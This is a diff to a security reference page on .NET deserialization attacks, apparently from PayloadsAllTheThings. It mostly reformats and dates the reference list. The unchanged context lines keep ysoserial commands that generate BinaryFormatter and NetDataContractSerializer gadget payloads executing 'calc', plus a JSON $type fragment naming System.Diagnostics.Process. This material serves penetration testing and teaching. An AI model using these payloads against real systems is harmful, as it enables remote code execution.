@@ -38,6 +38,7 @@ $ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
 ![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)    
 .NET Native Formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)
 
+
 ### XmlSerializer
 
 * In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.
@@ -84,6 +85,7 @@ $ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
 .\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
 ```
 
+
 ### LosFormatter
 
 * Use `BinaryFormatter` internally.
@@ -110,6 +112,7 @@ $ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
 ```
+
 
 ### BinaryFormatter
 
@@ -159,16 +162,16 @@ List of popular gadgets used in common payloads.
 
 ## References
 
-* [Attacking .NET Serialization - Alvaro - October 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
-* [Attacking .NET Deserialization - Alvaro Muñoz - 28 avr. 2018](https://youtu.be/eDfGpu3iE4Q)
-* [Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
-* [Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - White Paper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
-* [Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - DEF CON 25 Conference](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
-* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - Slides](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
-* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - White Paper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
-* [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - ALYSSA RAHMANDEC](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
-* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - 04/2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
-* [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
-* [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
-* [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Nov 2, 2021 - Shubham Shah](https://blog.assetnote.io/2021/11/02/sitecore-rce/)
-* [Finding a New DataContractSerializer RCE Gadget Chain - November 7, 2019 - dugisec](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
+- [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - Slides - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
+- [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - White Paper - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
+- [Attacking .NET Deserialization - Alvaro Muñoz - April 28, 2018](https://youtu.be/eDfGpu3iE4Q)
+- [Attacking .NET Serialization - Alvaro - October 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
+- [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - HackTricks - July 18, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
+- [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
+- [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - April 23, 2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
+- [Finding a New DataContractSerializer RCE Gadget Chain - dugisec - November 7, 2019](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
+- [Friday the 13th: JSON Attacks - DEF CON 25 Conference - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
+- [Friday the 13th: JSON Attacks - Slides - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
+- [Friday the 13th: JSON Attacks - White Paper - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
+- [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - Alyssa Rahman - December 13, 2021](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
+- [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Shubham Shah - November 2, 2021](https://blog.assetnote.io/2021/11/02/sitecore-rce/)
